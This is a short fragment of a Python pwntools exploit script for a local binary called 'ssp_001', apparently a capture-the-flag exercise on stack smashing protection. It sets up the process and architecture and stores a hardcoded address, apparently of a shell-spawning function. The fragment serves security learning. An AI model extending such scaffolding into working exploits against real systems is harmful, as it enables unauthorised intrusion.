from pwn import *

# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connect
p = process('./ssp_001')

# Set Context
context.arch = 'i386'
context.endian = 'little'

addr_sh = 0x80486b9
